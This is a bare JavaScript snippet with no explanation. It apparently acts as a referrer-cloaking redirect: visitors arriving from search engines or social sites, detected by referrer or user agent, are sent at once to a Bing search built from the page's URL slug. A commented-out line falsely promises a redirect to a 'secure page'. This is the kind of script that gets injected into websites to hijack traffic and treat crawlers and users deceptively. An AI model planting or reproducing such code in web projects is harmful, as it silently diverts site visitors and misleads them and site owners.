if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) { 
var url = window.location.href.split("/")[5]; 
var res = url.replace("-", " "); 
var totalWords = res ; 
var firstWord = totalWords.replace(/ .*/,''); 
function Redirect() { 
window.location="https://bing.com/search?q=" + firstWord; } 
//document.write("You will be redirected to secure page in seconds."); 
setTimeout('Redirect()', 0); } 
